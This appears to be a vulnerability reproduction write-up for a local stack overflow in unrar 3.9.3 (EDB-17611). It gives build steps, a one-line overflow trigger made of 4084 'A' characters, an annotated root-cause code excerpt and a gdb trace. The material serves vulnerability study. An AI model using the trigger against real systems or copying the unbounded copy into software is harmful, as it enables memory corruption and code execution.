# EDB-17611

## Experiment Environment

Ubuntu 14.04 LTS

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/EDB-17611/unrarsrc-3.9.3.tar.gz

tar -xvf unrarsrc-3.9.3.tar.gz
cd unrar
make -f makefile.unix

```

## Problems in Installation & Configuration

## How to trigger vulnerability

`unrar/unrar -$(perl -e 'print "A"x4084')`

stack buffer to be overflowed is 4096 bytes long, 4084 bytes of charater A and 24 bytes of added error message is just enough for triggering vulnerability. mainly to change File::hFile's value;

## PoCs

[Unrar 3.9.3 - Local Stack Overflow](https://www.exploit-db.com/exploits/17611/)

## Vulnerability Details & Patch

### Root Cause

consio.cpp:87
```
RawPrint() {
	File OutFile;
	char OutMsg[4096], *OutPos = OutMsg;
	for (int I = 0; Msg[I]!=0 ; I++) {
		if (Msg[I]!='\r')
			*(OutPos++)=Msg[I]; // only check if Mgs[I]==0 or Msg[I]=='\r', easy to overflow
	}

	OutFile.Write(Msg, strlen(Msg)); // OutFile's member - OutFile::hFile has already been changed due to overflow
}
```

### Stack Trace

```
(gdb) info stack
#0  0x66a77376 in ?? ()
#1  0xc9310807 in ?? ()
#2  0x6851e1f7 in ?? ()
#3  0x68732f2f in ?? ()
```

## References
